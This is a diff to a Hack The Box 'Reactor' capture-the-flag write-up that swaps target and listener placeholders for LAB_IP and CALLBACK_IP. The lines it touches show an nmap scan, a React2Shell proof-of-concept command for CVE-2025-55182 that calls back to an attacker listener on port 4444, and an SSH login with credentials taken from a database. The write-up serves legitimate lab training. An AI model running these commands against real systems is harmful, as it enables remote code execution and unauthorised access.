@@ -30,7 +30,7 @@ description: Reactor Hack The Box writeup covering React2Shell and a privileged 
 The completed scan found SSH and the web application:
 
 ```bash
-nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/nmap_full_scan <TARGET_IP>
+nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/nmap_full_scan LAB_IP
 ```
 
 | Port | Service | Observation |
@@ -56,8 +56,8 @@ The source notes use a React2Shell proof of concept for CVE-2025-55182. Replace 
 
 ```bash
 python3 react2shell.py \
-  -u http://<TARGET_IP>:3000/ \
-  -l <LHOST> \
+  -u http://LAB_IP:3000/ \
+  -l CALLBACK_IP \
   -p 4444
 ```
 
@@ -90,7 +90,7 @@ sqlite> select * from users;
 The recovered engineer credentials allow SSH access:
 
 ```bash
-ssh engineer@<TARGET_IP>
+ssh engineer@LAB_IP
 ```
 
 The user flag was read from the engineer home directory. The value is redacted in this public writeup:
